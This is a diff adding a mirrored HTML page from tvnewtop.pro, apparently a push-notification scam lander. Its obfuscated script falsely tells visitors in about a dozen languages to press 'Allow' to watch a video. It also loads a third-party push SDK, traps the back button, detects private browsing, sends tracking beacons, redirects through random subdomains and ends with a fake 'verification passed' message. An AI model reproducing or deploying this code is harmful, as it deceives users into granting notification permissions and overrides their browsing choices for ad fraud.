@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html>
+<!-- Mirrored from tvnewtop.pro/play?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUwNywid2lkIjo3Njg4LCJzcmMiOjJ9eyJ&bbr=1&si1=&si2= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Mar 2019 14:56:44 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <title>Play</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            background-color: #000;
+            height: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            color: #fff;
+            font: 300 16px Helvetica, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            text-align: center;
+            user-select: none
+        }
+
+        .fix,
+        body {
+            width: 100%
+        }
+
+        .fix {
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            z-index: 1
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        .msg {
+            background: url(images/play/play.png) no-repeat top;
+            background-size: 140px;
+            font-size: 28px;
+            padding: 215px 5px 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .isAndroid .msg {
+            background-position: bottom;
+            padding: 5% 5px 215px;
+            top: 0;
+            transform: none
+        }
+
+        .msgReady {
+            background-color: rgba(0, 0, 0, .75);
+            color: #fff;
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            width: 100%
+        }
+
+        .msgReady__tx {
+            font-size: 32px;
+            margin-top: 10%
+        }
+
+        @media (min-width:425px) {
+            .msgReady__tx {
+                font-size: 52px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="fix"></div>
+    <div class="msg"></div>
+    <div class="msgReady isHide">
+        <div class="msgReady__tx"></div>
+    </div>
+    <script>
+        ! function(t) {
+            var i = {};
+
+            function o(e) {
+                if (i[e]) return i[e].exports;
+                var n = i[e] = {
+                    i: e,
+                    l: !1,
+                    exports: {}
+                };
+                return t[e].call(n.exports, n, n.exports, o), n.l = !0, n.exports
+            }
+            o.m = t, o.c = i, o.d = function(e, n, t) {
+                o.o(e, n) || Object.defineProperty(e, n, {
+                    enumerable: !0,
+                    get: t
+                })
+            }, o.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, o.t = function(n, e) {
+                if (1 & e && (n = o(n)), 8 & e) return n;
+                if (4 & e && "object" == typeof n && n && n.__esModule) return n;
+                var t = Object.create(null);
+                if (o.r(t), Object.defineProperty(t, "default", {
+                        enumerable: !0,
+                        value: n
+                    }), 2 & e && "string" != typeof n)
+                    for (var i in n) o.d(t, i, function(e) {
+                        return n[e]
+                    }.bind(null, i));
+                return t
+            }, o.n = function(e) {
+                var n = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return o.d(n, "a", n), n
+            }, o.o = function(e, n) {
+                return Object.prototype.hasOwnProperty.call(e, n)
+            }, o.p = "", o(o.s = 2)
+        }([function(e, n) {
+            if (0 === "".length) {
+                var t = function() {
+                    void 0 !== this.requestFullScreen ? this.requestFullScreen() : void 0 !== this.webkitRequestFullScreen ? this.webkitRequestFullScreen() : void 0 !== this.mozRequestFullScreen && this.mozRequestFullScreen()
+                };
+                document.body.addEventListener("keydown", t), document.body.addEventListener("click", t)
+            }
+        }, , function(e, n, t) {
+            "use strict";
+            t.r(n);
+            var u = function() {
+                    var e = location.search.split("#")[0].split("?")[1];
+                    if (void 0 === e) return null;
+                    var i = {};
+                    return e.split("&").forEach(function(e) {
+                        var n = e.split("=");
+                        if (2 === n.length) i[n[0]] = n[1] || null;
+                        else {
+                            var t = n[0];
+                            n.shift(), i[t] = n.join("=")
+                        }
+                    }), i
+                },
+                i = u();
+            if (null !== i && void 0 !== i.bbr && "1" === i.bbr) {
+                var o = document.title,
+                    r = location.pathname + location.search;
+                history.pushState(null, o, r), window.addEventListener("popstate", function() {
+                    history.pushState({}, o, r)
+                })
+            }
+            t(0);
+            var a = function(n) {
+                    var e = decodeURIComponent(document.cookie).split(";");
+                    if (0 === e.length) return null;
+                    var t = null;
+                    return e.some(function(e) {
+                        if (" " === e[0] && (e = e.slice(1)), e = e.split("="), n === e[0]) return t = e[1], !0
+                    }), t
+                },
+                d = function(e, n, t, i) {
+                    var o = new Date;
+                    o.setTime(o.getTime() + 1e3 * t);
+                    var r = "; expires=" + o.toUTCString(),
+                        a = "";
+                    void 0 !== i && (a = "; domain=" + i), document.cookie = e + "=" + (n || "") + a + r + "; path=/"
+                },
+                c = function(e, n) {
+                    var t = new XMLHttpRequest;
+                    t.addEventListener("readystatechange", function() {
+                        if (2 === this.readyState && void 0 !== n) return n()
+                    }), t.addEventListener("error", function() {
+                        if (void 0 !== n) return n()
+                    }), t.open("GET.html", e, !0), t.responseType = "text", t.send()
+                },
+                s = function(e, n, t) {
+                    null == n && (n = "tracking");
+                    var i = 0;
+                    "tb" === e ? i = 7 : "private" === e && (i = 12);
+                    var o, r, a = u();
+                    null === a && (a = {}), o = void 0 === a.si1 || null === a.si1 ? "" : a.si1, r = void 0 === a.si2 || null === a.si2 ? "" : a.si2, o = o.slice(0, 32), r = r.slice(0, 32);
+                    var s = "https://nativenote.pro/rpe?" + ["a=1", "s=1", "act=" + i, "src=2", "p=1000864", "st=1005507", "wd=7688", "d=tvnewtop.pro", "tpl=6", "rnd=" + Math.random(), "sbid=" + encodeURIComponent(o), "sbid2=" + encodeURIComponent(r)].join("&");
+                    c(s, function() {
+                        if (d(n, "1", 86400, "tvnewtop.pro"), void 0 !== t) return t()
+                    })
+                },
+                l = function(e) {
+                    null !== window.opener && void 0 !== window.opener && opener.postMessage(e, "*")
+                },
+                f = function(e, n) {
+                    var t = "https://newsfresh.pro/tb?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUwNywid2lkIjo3Njg4LCJzcmMiOjJ9eyJ&amp;bbr=1&amp;si1=&amp;si2=";
+                    if (0 !== t.length) s("tb", null, function() {
+                        l({
+                            a: n ? "success" : "close"
+                        }), location.href = t
+                    });
+                    else if (void 0 !== e) return e(n)
+                },
+                v = {
+                    ua: navigator.userAgent,
+                    m: function(n) {
+                        var e = "normal",
+                            t = "private";
+
+                        function i() {
+                            return n(t)
+                        }
+
+                        function o() {
+                            return n(e)
+                        }
+                        if ("safari" === v.n) try {
+                            return window.openDatabase(null, null, null, null), n(e)
+                        } catch (e) {
+                            return n(t)
+                        } else if ("firefox" === v.n) {
+                            var r = indexedDB.open("test.html");
+                            r.addEventListener("error", i), r.addEventListener("success", o)
+                        } else {
+                            if ("edge" === v.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? n(e) : n(t);
+                            if ("opera" !== v.n && "yandex" !== v.n && "chrome" !== v.n) return n("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, o, i)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            n = "undefined" != typeof InstallTrigger,
+                            t = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            i = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            o = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            r = /UBrowser/.test(this.ua),
+                            a = /Edge\//.test(this.ua),
+                            s = null;
+                        return e ? s = "opera" : n ? s = "firefox" : o ? s = "yandex" : r ? s = "uc" : a ? s = "edge" : i ? s = "chrome" : t && (s = "safari"), s
+                    },
+                    get d() {
+                        var n = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            t = null;
+                        return Object.keys(n).some(function(e) {
+                            if (null !== v.ua.match(new RegExp(n[e], "i"))) return t = e, !0
+                        }), t
+                    }
+                },
+                m = v,
+                g = u(),
+                p = {
+                    c: 0,
+                    s: !0,
+                    r: parseInt("0", 10),
+                    next: function() {
+                        var e, n = "?",
+                            o = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
+                        o.forEach(function(e, n) {
+                            var t = Math.floor(Math.random() * (n + 1)),
+                                i = [o[t], o[n]];
+                            o[n] = i[0], o[t] = i[1]
+                        }), e = o.slice(0, 5).join(""), p.c++, null === g ? g = {
+                            i: p.c
+                        } : g.i = p.c, Object.keys(g).forEach(function(e) {
+                            null !== g[e] && (n += e + "=" + g[e] + "&")
+                        }), n = n.slice(0, -1), l({
+                            a: "next",
+                            c: p.c
+                        }), location.href = "https://" + e + ".tvnewtop.pro/play" + n
+                    },
+                    get can() {
+                        return this.s
+                    }
+                };
+            null !== g && void 0 !== g.i && (p.c = parseInt(g.i, 10)), 0 < p.r && (p.s = p.c < p.r);
+            var h = p,
+                w = function(n) {
+                    if (!(void 0 !== window.navigator && void 0 !== navigator.serviceWorker && void 0 !== window.PushManager && void 0 !== window.Notification)) return n(!1, "unsupported");
+                    m.m(function(e) {
+                        return "private" === e ? n(!1, e) : "unknown" === e ? n(!1, e) : n(!0, "supported")
+                    })
+                },
+                y = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (y.k = navigator.language.slice(0, 2)), void 0 === e[y.k] && (y.k = "en"), y.t = e[y.k]
+                    },
+                    get: function(e) {
+                        return y.t[e]
+                    }
+                },
+                b = y;
+
+            function R(e) {
+                l({
+                    a: e ? "success" : "close"
+                }), null !== window.opener && void 0 !== window.opener && close(), document.querySelector(".msg").classList.add("isHide"), document.querySelector(".msgReady").classList.remove("isHide")
+            }
+            var P = "convert";
+            if (h.can)
+                if ("firefox" === m.n && 2 === location.hostname.split(".").length) h.next();
+                else if (null !== a(P)) f(R, 1);
+            else {
+                var k = function() {
+                    window.edPushSDK.push(arguments)
+                };
+                window.edPushSDK = window.edPushSDK || [], k("onGranted", function() {
+                    d(P, "1", 604800, "tvnewtop.pro");
+                    var e = "";
+                    0 !== e.length ? c(e, function() {
+                        f(R, 1)
+                    }) : f(R, 1)
+                }), k("onDenied", function() {
+                    w(function(e) {
+                        e && h.next()
+                    })
+                }), k("onClose", function() {
+                    location.reload()
+                }), k("onSubscribed", function() {
+                    f(R, 1)
+                }), k("onError", function(e) {
+                    console.log(e)
+                });
+                var S = document.createElement("script");
+                S.async = !0, S.src = "https://serviceproworker.com/v1/sdk.js?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUwNywid2lkIjo3Njg4LCJzcmMiOjJ9eyJ&amp;d=tvnewtop.pro&amp;tpl=6", document.head.appendChild(S), w(function(e, n) {
+                    e || ("private" === n ? s(n, null, f(R)) : f(R))
+                })
+            } else f(R);
+            b.set({
+                ru: {
+                    msg: 'Нажмите "Разрешить", чтобы посмотреть видео',
+                    msgReady: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                en: {
+                    msg: 'Press "Allow" to watch the video',
+                    msgReady: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                fr: {
+                    msg: 'Cliquez sur "Autoriser" pour regarder la vidéo',
+                    msgReady: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    msg: 'Klicken Sie auf "Zulassen", um das Video anzusehen',
+                    msgReady: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    msg: 'Haga clic en "Permitir" para ver el video',
+                    msgReady: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                uk: {
+                    msg: 'Щоб подивитися відео натисніть "Дозволити"',
+                    msgReady: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    msg: 'Kliknij "Zezwalaj", aby obejrzeć wideo',
+                    msgReady: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                th: {
+                    msg: 'คลิก "อนุญาต" เพื่อดูวิดีโอ',
+                    msgReady: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                },
+                it: {
+                    msg: 'Consenti  Premi "Consenti" per guardare il video',
+                    msgReady: "Hai superato con successo la verifica!<br>Ora puoi chiudere la finestra."
+                },
+                vi: {
+                    msg: 'Chan Nhấn "chận" để xem video',
+                    msgReady: "Bạn đã vượt qua thành công xác minh!<br>Bây giờ bạn có thể đóng cửa sổ."
+                },
+                ar: {
+                    msg: 'اضغط على "سماح" لمشاهدة الفيديو',
+                    msgReady: "الآن يمكنك إغلاق النافذة.<br>لقد نجحت في اجتياز التحقق!"
+                },
+                id: {
+                    msg: "Tekan «Izinkan» untuk menonton video",
+                    msgReady: "Anda berhasil lolos verifikasi!<br>Sekarang Anda bisa menutup jendela."
+                },
+                ms: {
+                    msg: 'Tekan "Benarkan" untuk menonton video',
+                    msgReady: "Anda berjaya meluluskan pengesahan!<br>Kini anda boleh menutup tetingkap."
+                },
+                pt: {
+                    msg: 'Pressione "Permitir" para assistir ao vídeo',
+                    msgReady: "Você passou com sucesso a verificação!<br>Agora você pode fechar a janela."
+                },
+                zh: {
+                    msg: "按“允許”觀看視頻",
+                    msgReady: "您已成功通过验证！<br>现在你可以关闭窗口了。"
+                },
+                tr: {
+                    msg: "Videoyu izlemek için «Engelle» e basın",
+                    msgReady: "Doğrulamayı başarıyla geçtiniz!<br>Şimdi pencereyi kapatabilirsin."
+                }
+            }), "android" === m.d && document.body.classList.add("isAndroid"), document.querySelector(".msg").innerHTML = b.get("msg"), document.querySelector(".msgReady__tx").innerHTML = b.get("msgReady")
+        }]);
+    </script>
+</body>
+<!-- Mirrored from tvnewtop.pro/play?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUwNywid2lkIjo3Njg4LCJzcmMiOjJ9eyJ&bbr=1&si1=&si2= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Mar 2019 14:56:48 GMT -->
+
+</html>
